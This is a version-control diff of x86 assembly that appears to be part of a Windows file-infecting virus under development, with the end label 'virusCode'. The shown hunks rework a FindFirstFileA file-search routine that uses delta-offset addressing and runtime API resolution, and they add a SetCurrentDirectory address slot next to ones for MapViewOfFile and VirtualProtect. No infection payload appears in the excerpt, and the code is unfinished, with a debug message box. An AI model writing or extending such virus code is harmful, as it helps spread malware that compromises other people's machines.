@@ -112,15 +112,7 @@ find_API:
 	
 	call find_APIAddress						      ; now get api address 
 	
-	lea eax,offset Win32Data
-	add eax,ebp
-	push eax
-	lea eax,offset search_mask
-	add eax,ebp
-	push eax
-	call [ebp+FindFirstFileAAddress]
-	cmp eax , 0
-	mov dword ptr[ebp+search_handle],eax
+	call find_first_file
 	
 	
 ;	push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
@@ -130,14 +122,19 @@ find_API:
 ;	call [ebp+VirtualProtectAddress]
 	
 find_first_file:
-	push dword ptr [ebp+Win32Data]
-	push dword ptr [ebp+search_mask]
+	lea eax,offset Win32Data
+	add eax,ebp
+	push eax
+	lea eax,offset search_mask
+	add eax,ebp
+	push eax
 	call [ebp+FindFirstFileAAddress]
+	cmp eax , 0
 	mov dword ptr[ebp+search_handle],eax
-find_next_file:
-	cmp eax,0
-	invoke MessageBox, NULL, addr FindFirstFileSuccess , addr FolderFound, MB_OK 
 	je done_find
+find_next_file:
+	
+	invoke MessageBox, NULL, addr FindFirstFileSuccess , addr FolderFound, MB_OK 
 done_find:
 	ret
 	invoke ExitProcess,0
@@ -381,6 +378,6 @@ APIAddress:
 	UnmapViewOfFileAddress   		dd    0h
 	CloseHandleAddress        		dd    0h
 	VirtualProtectAddress    		dd    0h
-
+	SetCurrentDirectoryAddress 		dd    0h
 
 end virusCode
